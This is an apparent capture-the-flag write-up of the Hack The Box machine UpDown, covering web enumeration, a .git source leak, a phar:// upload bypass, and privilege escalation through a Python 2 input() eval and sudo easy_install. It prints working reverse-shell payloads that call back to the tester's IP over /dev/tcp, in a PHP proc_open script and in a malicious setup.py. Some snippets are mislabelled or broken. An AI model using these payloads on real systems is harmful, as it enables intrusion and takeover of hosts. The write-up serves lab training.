# UpDown - HTB Labs Writeup

**Machine:** Certified (Linux)

**Difficulty:** Medium

<img width="1030" height="217" alt="33333" src="https://github.com/user-attachments/assets/3c0bd11e-4b0c-4032-9431-68f25633fee5" />

## Background / Scope
- **TargetIP:** `10.10.11.177`
- **Goal:** Obtain `user.txt` and `root.txt` (or Administrator) on the machine in a lab environment.
- **Machine Info:** UpDown is a medium difficulty Linux machine with SSH and Apache servers exposed. On the Apache server a web application is featured that allows users to check if a webpage is up. A directory named `.git` is identified on the server and can be downloaded to reveal the source code of the `dev` subdomain running on the target, which can only be accessed with a special `HTTP` header. Furthermore, the subdomain allows files to be uploaded, leading to remote code execution using the `phar://` PHP wrapper. The Pivot consists of injecting code into a `SUID` `Python` script and obtaining a shell as the `developer` user, who may run `easy_install` with `Sudo`, without a password. This can be leveraged by creating a malicious python script and running `easy_install` on it, as the elevated privileges are not dropped, allowing us to maintain access as `root`.

## Target enumeration (nmap)

```php
nmap -sC -sV 10.10.11.177    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 08:34 EST
Nmap scan report for 10.10.11.177
Host is up (0.68s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 179.95 seconds

```

We see only `SSH(22)` and `HTTP(80)` services are running on this machine.Let's check what's in HTTP service

<img width="816" height="526" alt="web" src="https://github.com/user-attachments/assets/d3d27f5c-303d-4b0f-82c6-935e80389f60" />

It's simple web, where we can check site is up or down.If I check my machine IP on this site, I can catch `netcat` request.I didn't find anything else on this web, so I try directory brute force on this website.


## Directory Brute Force


<img width="751" height="578" alt="3" src="https://github.com/user-attachments/assets/f8c615b8-532c-45e0-8ac4-412165c4d8ee" />

I only found `dev` directory, where I didn't see anything there,so I tried again, but this time I used `gobuster`

```text
gobuster dir -u http://10.10.11.177/dev -w /usr/share/wordlists/dirb/common.txt  -x php,txt,json
```

<img width="609" height="498" alt="4" src="https://github.com/user-attachments/assets/bdf5a955-b6e0-4664-8804-4a803ae926b8" />

We see interesting directory `/.git`


<img width="802" height="550" alt="5" src="https://github.com/user-attachments/assets/03dbf8f0-e690-45c7-902f-2678f35373c2" />

To download all `.git` files on this machine I used [git-dumper](https://github.com/arthaud/git-dumper) tool.

```text
git-dumper http://siteisup.htb/.git /tmp/siteisup
```

<img width="839" height="617" alt="6" src="https://github.com/user-attachments/assets/5b39c94d-084c-4892-b49b-e386a4f7cfad" />


## HTTP Enumeration

We see interesting files we got.
```python
─# ls -la         
total 40
drwxrwxr-x 3 root    root    4096 Nov  7 10:05 .
drwxrwxr-x 4 odinaev odinaev 4096 Nov  7 10:11 ..
-rw-rw-r-- 1 root    root      59 Nov  7 10:05 admin.php
-rw-rw-r-- 1 root    root     147 Nov  7 10:05 changelog.txt
-rw-rw-r-- 1 root    root    3145 Nov  7 10:05 checker.php
drwxrwxr-x 7 root    root    4096 Nov  7 10:05 .git
-rw-rw-r-- 1 root    root     117 Nov  7 10:05 .htaccess
-rw-rw-r-- 1 root    root     273 Nov  7 10:05 index.php
-rw-rw-r-- 1 root    root    5531 Nov  7 10:05 stylesheet.css
```

I found interesting on the file `checker.php`.Let's breaking down only interesting part of `checker.php` for our enumeration proccess.
```python

	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
```
This part of this code shows up file extensions, so easy to guess we can `upload file`

```python  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
```
File `changelog.txt` confirmed it
```text
Beta version

1- Check a bunch of websites.

-- ToDo:

1- Multithreading for a faster version :D.
2- Remove the upload option.
3- New admin panel.
```
Also our file `index.php` shows up `File Inclusion` vulnerability on this machine
```python
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	
?>
```

When we try to upload our file, our uploaded file will locate on `/uploads` directory.So we need to find where this upload page is.Let's try to fuzz our target subdomain

<img width="573" height="390" alt="2" src="https://github.com/user-attachments/assets/e63950a2-07de-499e-a368-d1f9c9742f58" />

I saved this on my `/etc/hosts` directory
```python
10.10.11.177         siteisup.htb dev.siteisup.htb
```
I can't open `dev.siteisup.htb`, so I try to enumerate another files we got

File `.htaccess` gave me a hint about `Header`, but i don't know where I can use it
```text
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header

```
I've checked `.git` logs and figured out

<img width="551" height="355" alt="9" src="https://github.com/user-attachments/assets/e6bf95ff-3ac9-4790-a6a9-b9d6f3657936" />

That means we can open up our `dev.siteisup.htb` only with our `Header`, which showing in `.htaccess`.I just added `Special-Dev: only4dev`

```text
curl -I -H ”Special-Dev: only4dev“ http://dev.siteisup.htb/
```


<img width="917" height="575" alt="burp" src="https://github.com/user-attachments/assets/2fb6969e-337a-4499-92d2-cbe5f69d8b08" />

We've successfully found our upload page

<img width="1209" height="697" alt="10" src="https://github.com/user-attachments/assets/487b2948-dd6e-4404-9c91-1f53a0895507" />

## File Upload 

First of all, I check up `File Inclusion` vulnerbility

<img width="924" height="532" alt="12" src="https://github.com/user-attachments/assets/14b4997a-1c7f-435a-ba0b-5371f32cf746" />

I run simple 'php filter' to get our index page from server and got `base64` encode
```python
 echo 'PGI+VGhpcyBpcyBvbmx5IGZvciBkZXZlbG9wZXJzPC9iPgo8YnI+CjxhIGhyZWY9Ij9wYWdlPWFkbWluIj5BZG1pbiBQYW5lbDwvYT4KPD9waHAKCWRlZmluZSgiRElSRUNUQUNDRVNTIixmYWxzZSk7CgkkcGFnZT0kX0dFVFsncGFnZSddOwoJaWYoJHBhZ2UgJiYgIXByZWdfbWF0Y2goIi9iaW58dXNyfGhvbWV8dmFyfGV0Yy9pIiwkcGFnZSkpewoJCWluY2x1ZGUoJF9HRVRbJ3BhZ2UnXSAuICIucGhwIik7Cgl9ZWxzZXsKCQlpbmNsdWRlKCJjaGVja2VyLnBocCIpOwoJfQkKPz4K' | base64 -d
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
        define("DIRECTACCESS",false);
        $page=$_GET['page'];
        if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
                include($_GET['page'] . ".php");
        }else{
                include("checker.php");
        }
?>
```
We just confirm, we have `File Inclusion vulnerbility`




I already know about extension on this page
```python
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
```
If I try php file, It will  output `Extension not allowed`


<img width="852" height="451" alt="exten" src="https://github.com/user-attachments/assets/7e50d66e-807b-4697-9a3a-e90e6b7a4ed4" />

When I tried rename to text my file and upload it again.If I try to write in our file my machine IP, I get connection back with my `netcat` running

<img width="499" height="138" alt="19" src="https://github.com/user-attachments/assets/2db5c834-7ce6-4fd2-b30f-2b3a004ce663" />


<img width="861" height="500" alt="16" src="https://github.com/user-attachments/assets/e6afa465-060d-494d-aa83-7d7a66dcec45" />

So we try to bypass with zip our `upload.php` in upload.jpeg and upload file as `upload.jpeg`
We just want to run simple php code 
```php
<?php
echo 'Hala Madrid' ;
?>
http://10.10.16.4
```
I uploaded our `uploads.jpeg` 

<img width="1021" height="370" alt="22" src="https://github.com/user-attachments/assets/8d0e2818-a9bc-432b-b252-a7124a1d4df4" />

I copied the path of upload file and pasted on my `Burp Suite` with `phar://`
PHAR archives store metadata which PHP may unserialize when opened via phar://

<img width="932" height="518" alt="24" src="https://github.com/user-attachments/assets/5b75f290-432e-4522-b7e1-9aa5a2481ed9" />

As we can see, our commands worked and my simple php web shell doesn't work:
```php
<?php system($_SYSTEM(['cmd'])); ?>
```
Maybe `SYSTEM` function doesn't work, so I need to run `phpinfo() to find out what functions I can run

<img width="168" height="40" alt="netcat" src="https://github.com/user-attachments/assets/b6cba90d-ef13-45ba-a064-2dee245dfe54" />

<img width="930" height="578" alt="26" src="https://github.com/user-attachments/assets/64a2a893-b2f7-40fa-b613-0f462f20191d" />


So we got PHP page


<img width="1222" height="722" alt="27" src="https://github.com/user-attachments/assets/7997a1f6-8d44-4756-858a-98453c37ba40" />

To find out what function we can't run, we just find `disable_functions` on this page


<img width="941" height="179" alt="28" src="https://github.com/user-attachments/assets/6dd67ae8-d168-4928-8bf8-27814ac7d323" />


I just run this php code 
```php
<?php
$dangerous_functions = array('pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait',
'pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued',
'pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal',
'pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error',
'pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait',
'pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','pcntl_unshare',
'error_log','system','exec','shell_exec','popen','passthru',
'link','symlink','syslog','ld','mail','mbstring','imap_open','imap_mail','libvirt_connect','gnupg_init','imagick');


foreach ($dangerous_functions as $function){
    if (function_exists($function)) {
        echo $function . "is enabled\n";
    }
}
```

I saved it as `dangerous.php` and zipped it on `upload.jpeg`.When I upload this php code and run it, it showed me `proc_open` function is enabled on this machine
`proc_open` - Execute a command and open file pointers for input/output.[This repo](https://gist.github.com/noobpk/33e4318c7533f32d6a7ce096bc0457b7#file-reverse-shell-php-L62) on line shows how to reverse shell using this function


<img width="791" height="177" alt="shell" src="https://github.com/user-attachments/assets/aee4eae4-4309-4acb-bab8-b7d5bf50e393" />


So I modified my `dangerous.php` and saved it as `shell.php`
```python
<?php
$dangerous_functions = array('pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait',
'pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued',
'pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal',
'pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error',
'pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait',
'pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','pcntl_unshare',
'error_log','system','exec','shell_exec','popen','passthru',
'link','symlink','syslog','ld','mail','mbstring','imap_open','imap_mail','libvirt_connect','gnupg_init','imagick');


foreach ($dangerous_functions as $function){
    if (function_exists($function)) {
        echo $function . "is enabled\n";
    }
}
$cmd = "bash -c 'bash -i >& /dev/tcp/10.10.16.4/9001 0>&1'";
$desciptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to

);
$process = proc_open($cmd, $desciptorspec, $pipes);
```

Now we successfully got Reverse Shell!

```python
 nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.177] 49016
bash: cannot set terminal process group (911): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev$ ls
```

## Shell as Devoloper

```python
www-data@updown:/home/developer$ ls
ls
dev
user.txt
www-data@updown:/home/developer$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```
As we can see we don't have permission to read this file, so we need privilege as `Developer` user



I found interesting python scripts in the `/dev` directory

```python
www-data@updown:/home/developer/dev$ ls
ls
siteisup
siteisup_test.py
```
When I try to run this scripts, it's getting error messages

```python
www-data@updown:/home/developer/dev$ ./siteisup
./siteisup

Enter URL here:Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 0
    
    ^
SyntaxError: unexpected EOF while parsing
Welcome to 'siteisup.htb' application

```

The problem here is `input()` 
Why `input()` in Python2 is dangerous:

- In Python2, input() treats your input as Python code

- It's like using eval(raw_input()) - it EXECUTES whatever you type

- In Python3, input() just gets text (safe)

### Example of this Problem:

Normal use (fails):

```text
Enter URL here:http://google.com
❌ ERROR - because "http://google.com" isn't valid Python code
```

Malicious use (works):
```
Enter URL here:__import__('os').system('id')
✅ EXECUTES: runs the command 'id' on the system

Enter URL here:__import__('os').system('cat /etc/passwd')
✅ EXECUTES: shows system passwords

Enter URL here:__import__('os').system('bash')
✅ EXECUTES: gives you a shell!
```

How it looks like in our machine when we try to find `id`

<img width="602" height="463" alt="id" src="https://github.com/user-attachments/assets/6f634cd0-07b6-4f18-9fbe-e64bc0538f85" />


So I tried `__import__('os').system('bash')` and we got shell as `Developer`

```python
www-data@updown:/home/developer/dev$ ./siteisup                   
./siteisup                                                                                                                                                  
__import__('os').system('bash')                                                                                                                             
                                                                                                                                                            
whoami                                                                                                                                                      
developer
python3 -c "import pty;pty.spawn('/bin/bash')"                                                                                                              
developer@updown:/home/developer/dev$ ls                                                                                                                    
ls
siteisup  siteisup_test.py
```

But I still can't read `user.txt`

```python
developer@updown:/home/developer$ ls
ls
dev  user.txt
developer@updown:/home/developer$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

We can get access to  `./ssh` directory and obtain `id_rsa` 



<img width="676" height="593" alt="keys" src="https://github.com/user-attachments/assets/153abf61-1a9f-4fd8-bdc5-54bc90420fea" />


Now we got `SSH` as `Developer`

<img width="600" height="646" alt="shell1" src="https://github.com/user-attachments/assets/cdba1ddb-fa0f-4dc6-88d0-ed1baaba295f" />



## Privilege Escalation

I run `sudo -l` command to find what command we can run with no sudo password require

```python
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

Let's see what this script does
```python
developer@updown:~$ cat /usr/local/bin/easy_install
#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from setuptools.command.easy_install import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```
Perfect! I found a privilege escalation vector via easy_install. This is a classic Python package manager that can be exploited to get root.

So I made simple reverse shell command 
```python
developer@updown:~$ mkdir tmp
developer@updown:~$ cd tmp
developer@updown:~/tmp$ echo 'import os\n\nos.system("bash -c 'bash -i >& /dev/tcp/10.10.16.4 0>&1'")
> xit
> dkcsdcl
> ^C
developer@updown:~/tmp$ ls
developer@updown:~/tmp$ cat > setup.py << 'EOF'
> import os
> os.system("bash -c 'bash -i >& /dev/tcp/10.10.16.4/4444 0>&1'")
> EOF
developer@updown:~/tmp$ ls
setup.py
```

I set up netcat listener `nc -lvnp 4444` and got reverse back
```python
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.177] 33588
root@updown:/home/developer/tmp#
```
Now we are `root`
```python
root@updown:~# cat root.txt
cat root.txt


⭐ If you found this writeup helpful — consider giving a star on GitHub!
2bcb81598046c8e2***********
```




